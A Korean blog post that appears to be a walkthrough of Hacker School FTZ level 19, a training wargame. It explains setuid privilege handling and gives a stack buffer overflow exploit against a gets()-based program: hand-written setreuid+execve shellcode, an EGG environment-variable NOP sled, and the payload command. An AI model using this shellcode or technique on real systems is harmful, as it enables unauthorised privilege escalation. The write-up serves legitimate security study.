---
layout: post
title: "Hacker School FTZ - Level 19"
description: "Do you know the ?"
comments: true
categories: FTZ
---

<img data-action="zoom" src='{{ "assets/ftz/level19/1.jpg" | relative_url }}' alt='relative'>  

## 1) level19/swimming in pink 입력해 로그인  

``` c 
main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```

<img data-action="zoom" src='{{ "assets/ftz/level19/2.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level19/3.png" | relative_url }}' alt='relative'>  

코드를 통해 gets 함수를 사용해 입력 길이에 제한을 두지 않았다는 것을 확인하였고,  
gdb로 분석해보니 buf 배열은 ebp에서 40 byte 떨어진 주소에 위치하고 bof를 방지하는 보안 대책이 없다는 것을 확인했습니다.  

RET에 쉘코드가 저장된 위치의 주소를 입력해 bof를 일으키면 쉘은 실행됩니다.  
문제는 level19 권한의 쉘이 실행된다는 것입니다.  

<img data-action="zoom" src='{{ "assets/ftz/level19/4.png" | relative_url }}' alt='relative'>  

앞서 문제에서는 프로그램 코드 내에 setreuid 함수가 호출됐었습니다.  
그러나 이번 문제에서는 setreuid 함수가 호출되지 않았습니다.  
따라서 이번 문제를 풀기 위해선 쉘코드에 setreuid 함수를 호출하는 기계어 코드를 넣어줘야 합니다.    

## 2) 쉘코드에 setreuid 함수 호출하는 기계어 추가하기  

모든 프로세스별로  
Real User ID(RUID),  
Effective User ID(EUID),  
Saved User ID(SUID)가 있습니다.  

-> RUID는 시스템에 접속한 사용자의 ID입니다. 프로세스를 시작하는 사용자를 결정하는 데 사용됩니다.    

-> EUID는 프로세스에 대한 권한을 결정합니다. 프로그램에 SetUID가 설정되어 있다면 프로세스의 권한은 일시적으로 user의 ID를 갖습니다.  

-> SUID는 이전 EUID 값을 저장하는 데 사용됩니다. SUID로 이전 EUID를 복원할 수 있습니다.  


SetUID가 설정된 attackme 파일을 실행하기 전에는 RUID=level19, EUID=level19 입니다.  

<img data-action="zoom" src='{{ "assets/ftz/level19/5.png" | relative_url }}' alt='relative'>  

attackme 프로그램이 실행하면 EUID(level19)를 SUID에 복사한 뒤,  
EUID는 level20 user의 ID를 일시적으로 갖습니다.  

attackme 프로세스가 종료하면 SUID에 저장되어 있던 값을 EUID에 복사하여 기존 권한으로 전환합니다.  


프로그램 내에서 setreuid를 호출하지 않기 때문에  
main 함수가 종료되면서 EUID는 level19 권한으로 전환되고,  
쉘코드가 저장되어 있는 위치에 가서 쉘코드를 실행시키더라도  
쉘코드에서는 execve 함수만 호출하기 때문에 RUID, EUID(level19) 권한으로 쉘이 실행됩니다.  

따라서 쉘코드에 setreuid 함수를 호출하는 기계어를 추가해야 합니다.  

<a href="https://hsong2.github.io/ftz/2021/05/24/Hacker-School-FTZ-Shellcode.html#setreuid">setreuid 함수 호출이 포함된 쉘코드 작성 방법</a>  


위 문서를 참고하여 setreuid 함수 호출 코드가 포함된 39 byte의 쉘코드를 만들 수 있었습니다.    

``` bash
\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

## 3) attackme에 bof 일으켜 level20 권한의 shell 획득하기  

1) EGG 환경변수에 쉘코드 저장  

``` bash
export EGG=`python -c 'print "\x90"*30+"\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*30'`
```

2) EGG 환경변수 주소 확인하기 (1)  

``` bash
echo 'int main() { printf("ADDR -> %p\n", getenv("EGG")); }' > getenv.c
```

3) EGG 환경변수 주소 확인하기 (2)  

``` bash
gcc -o getenv getenv.c
```

4) EGG 환경변수 주소 확인하기 (3)  

``` bash
./getenv
```

5) attackme bof 공격하기

``` bash
(python -c 'print "\x90"*44+"[쉘코드가 저장된 주소]"'; cat) | ./attackme
```


<img data-action="zoom" src='{{ "assets/ftz/level19/6.png" | relative_url }}' alt='relative'>  

